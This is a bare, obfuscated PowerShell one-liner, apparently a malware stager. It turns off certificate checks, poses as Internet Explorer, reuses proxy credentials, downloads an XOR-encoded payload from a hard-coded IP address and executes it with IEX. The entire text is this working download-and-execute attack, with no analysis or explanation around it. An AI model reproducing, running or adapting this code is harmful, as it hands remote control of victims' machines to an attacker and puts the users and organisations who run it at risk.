
$WC=NEW-OBjECT SySteM.NET.WeBClIent;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$Wc.HEaDeRs.Add('User-Agent',$u);$Wc.ProxY = [SYstem.Net.WEbREqUESt]::DefaUlTWeBPrOXy;$wc.PRoxy.CRedeNtiAls = [SySteM.NET.CReDEntiALCaChe]::DEFaULTNETwoRkCREDEnTiaLS;$K='0qoga`PzyB\pse]{_iO.G*Dd>uN=x?:S';$i=0;[CHAr[]]$B=([ChAR[]]($wc.DownloaDStrInG("https://46.101.90.248:443/index.asp")))|%{$_-BXOr$k[$I++%$K.LengTh]};IEX ($b-joiN'')

